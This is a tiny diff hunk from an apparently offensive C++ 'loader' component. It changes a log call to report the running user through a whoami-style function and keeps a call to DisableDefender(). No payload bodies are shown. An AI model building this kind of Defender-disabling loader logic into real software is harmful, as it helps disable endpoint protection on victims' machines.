@@ -4,7 +4,7 @@ std::string componentName = "loader";
 
 int wmain() {
 	Log("[+] Starting " + componentName + ".", componentName);
-	Log("[*] Running as " + UserRunningProcess(), componentName);
+	Log("[*] Running as " + RunWhoami(), componentName);
 
 	if (DisableDefender() != 0) {
 		// disabling defender failed
